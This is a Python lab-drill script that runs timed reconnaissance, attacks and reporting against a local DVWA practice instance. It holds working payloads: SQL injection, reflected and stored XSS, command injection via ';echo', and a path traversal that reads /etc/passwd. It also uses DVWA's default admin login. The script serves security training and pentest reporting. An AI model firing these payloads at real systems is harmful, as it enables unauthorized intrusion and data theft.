"""限时练兵（D）：对 DVWA 做一次完整的「侦察→分类攻击→验证→出报告」并计时。

目标: http://192.168.56.101/dvwa/  (Kali 中的 DVWA, Host-Only 网络)
用法: python drill_dvwa.py            # 输出 findings + 各阶段耗时
      python drill_dvwa.py --quick    # 跳过 LFI/上传
"""
import http.cookiejar
import json
import pathlib
import re
import sys
import time
import urllib.parse
import urllib.request

BASE = "http://192.168.56.101/dvwa"
HERE = pathlib.Path(__file__).parent
T0 = time.time()
STEPS = []


def mark(name):
    STEPS.append((name, round(time.time() - T0, 1)))


def make_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def get(op, path):
    with op.open(BASE + path, timeout=15) as r:
        return r.status, r.read().decode("utf-8", "replace")


def post(op, path, data):
    body = urllib.parse.urlencode(data).encode()
    rq = urllib.request.Request(BASE + path, data=body)
    with op.open(rq, timeout=15) as r:
        return r.status, r.read().decode("utf-8", "replace")


def token(html, name="user_token"):
    m = re.search(rf"name='{name}' value='([^']+)'", html) or re.search(rf'name="{name}" value="([^"]+)"', html)
    return m.group(1) if m else ""


def main():
    try:
        sys.stdout.reconfigure(encoding="utf-8", errors="replace")
    except Exception:  # noqa: BLE001
        pass
    findings = []
    op = make_opener()

    # ---------- ① 侦察 ----------
    s, home = get(op, "/login.php")
    print(f"[侦察] /login.php -> {s}, 长度 {len(home)}")
    s, login = post(op, "/login.php", {"username": "admin", "password": "password",
                                       "Login": "Login", "user_token": token(home)})
    authed = "Logout" in login or "logout" in login
    print(f"[侦察] 登录 -> {s}, 认证成功={authed}")
    mark("① 侦察+登录")
    if not authed:
        print("  登录失败，终止")
        return

    # 降安全等级到 low（DVWA 特性）
    s, sec = get(op, "/security.php")
    post(op, "/security.php", {"security": "low", "seclev_submit": "Submit", "user_token": token(sec)})

    # ---------- ② 分类攻击 ----------
    # SQLi（布尔对照）
    _, b1 = get(op, "/vulnerabilities/sqli/?id=1&Submit=Submit")
    _, b2 = get(op, "/vulnerabilities/sqli/?id=1%27%20OR%20%271%27%3D%271&Submit=Submit")
    n1 = len(re.findall(r"First name", b1))
    n2 = len(re.findall(r"First name", b2))
    if n2 > n1:
        findings.append({"id": "D1", "name": "SQL 注入（布尔绕过，DVWA sqli）", "category": "注入",
                         "severity": "严重", "target": BASE + "/vulnerabilities/sqli/",
                         "evidence": f"基线 id=1 返回 {n1} 条记录；id=1' OR '1'='1 返回 {n2} 条 → 条件被注入改变结果集",
                         "desc": "id 参数未参数化，直接拼接进 SQL 查询。",
                         "steps": ["GET /vulnerabilities/sqli/?id=1 记录返回条数（基线）",
                                   "GET /vulnerabilities/sqli/?id=1' OR '1'='1 观察返回条数增加",
                                   "进一步用 UNION SELECT 可读取 users 表"],
                         "impact": "可读取数据库全部数据，包括用户凭据表。",
                         "fix": "使用参数化查询；数据库账号最小权限。"})
    mark("② 注入类")

    # 反射型 XSS
    pl = "<script>XSS_R_MARK_55</script>"
    _, rx = get(op, "/vulnerabilities/xss_r/?name=" + urllib.parse.quote(pl))
    if pl in rx:
        findings.append({"id": "D2", "name": "反射型 XSS（DVWA xss_r）", "category": "XSS",
                         "severity": "中", "target": BASE + "/vulnerabilities/xss_r/",
                         "evidence": f"name 参数提交 {pl} 后，响应 HTML 中原样出现未转义的脚本",
                         "desc": "name 参数被原样输出到 HTML 上下文。",
                         "steps": ["提交 ?name=<script>...</script>", "查看响应中脚本未被转义"],
                         "impact": "可诱导受害者点击构造链接后在其浏览器执行脚本（需交互）。",
                         "fix": "输出按上下文做 HTML 实体编码；加 CSP。"})

    # 存储型 XSS
    pl2 = "<script>XSS_S_MARK_66</script>"
    post(op, "/vulnerabilities/xss_s/", {"txtName": pl2, "mtxMessage": "hello", "btnSign": "Sign Guestbook"})
    _, sg = get(op, "/vulnerabilities/xss_s/")
    if pl2 in sg:
        findings.append({"id": "D3", "name": "存储型 XSS（DVWA xss_s，持久回显）", "category": "XSS",
                         "severity": "高", "target": BASE + "/vulnerabilities/xss_s/",
                         "evidence": f"提交 {pl2} 后重新 GET 页面，payload 以未转义原文出现在留言列表中",
                         "desc": "留言内容原样入库并在展示时未转义。",
                         "steps": ["POST txtName=<script>...</script>", "重新 GET /vulnerabilities/xss_s/ 确认脚本原文仍在"],
                         "impact": "所有访问留言板的用户（含管理员）浏览器都会执行脚本，可窃取会话。",
                         "fix": "存储与展示均按上下文编码；CSP；Cookie 加 HttpOnly。"})
    mark("③ XSS 类")

    # 命令注入（DVWA exec 模块走 POST）
    _, ci = post(op, "/vulnerabilities/exec/",
                 {"ip": "127.0.0.1;echo CMDINJ_MARK_77", "Submit": "Submit"})
    if "CMDINJ_MARK_77" in ci:
        findings.append({"id": "D4", "name": "命令注入（DVWA exec，可执行任意系统命令）", "category": "命令注入",
                         "severity": "严重", "target": BASE + "/vulnerabilities/exec/",
                         "evidence": "POST ip=127.0.0.1;echo CMDINJ_MARK_77 → 响应中出现注入命令的输出 CMDINJ_MARK_77",
                         "desc": "ip 参数被拼接进 shell 命令执行。",
                         "steps": ["POST /vulnerabilities/exec/ 参数 ip=127.0.0.1;echo CMDINJ_MARK_77", "确认响应包含该标记串"],
                         "impact": "攻击者可以 Web 服务权限执行任意系统命令，通常直接导致服务器失陷。",
                         "fix": "使用参数数组调用（shell=False）；禁止拼接 shell；输入白名单。"})

    # 文件包含（LFI）—— DVWA fi 的包含基准在 vulnerabilities/fi/，需 5 层才到根
    if "--quick" not in sys.argv:
        hit = None
        for depth in (5, 4, 6):
            _, lfi = get(op, "/vulnerabilities/fi/?page=" + "../" * depth + "etc/passwd")
            if "root:x:" in lfi or "root:*:0:0" in lfi:
                hit = depth
                break
        if hit:
            findings.append({"id": "D5", "name": "本地文件包含（DVWA fi，可读系统文件）", "category": "路径穿越",
                             "severity": "高", "target": BASE + "/vulnerabilities/fi/",
                             "evidence": f"page={'../' * hit}etc/passwd → 响应返回 /etc/passwd 内容（出现 root:x: 行）",
                             "desc": "page 参数直接用于文件包含且未限制目录。",
                             "steps": [f"GET /vulnerabilities/fi/?page={'../' * hit}etc/passwd", "确认响应含 passwd 内容"],
                             "impact": "可读取服务器任意可读文件（源码/配置/凭据），并可结合日志投毒升级为 RCE。",
                             "fix": "禁止用户控制包含路径（白名单映射）；关闭 allow_url_include；open_basedir 限制。"})
    mark("④ 命令注入+文件包含")

    # ---------- ③ 汇总 ----------
    out = HERE / "drill_dvwa_findings.json"
    out.write_text(json.dumps(findings, ensure_ascii=False, indent=1), encoding="utf-8")
    total = round(time.time() - T0, 1)
    print(f"\n=== 演练结果：命中 {len(findings)} 项，总耗时 {total} 秒 ===")
    for f in findings:
        print(f"  [{f['severity']}] {f['id']} {f['name']}")
    print("\n=== 各阶段耗时 ===")
    prev = 0.0
    for name, t in STEPS:
        print(f"  {name:<22} {t:>6.1f}s (累计)")
        prev = t
    print(f"  {'合计':<22} {total:>6.1f}s")
    print(f"已存: {out}")


if __name__ == "__main__":
    main()
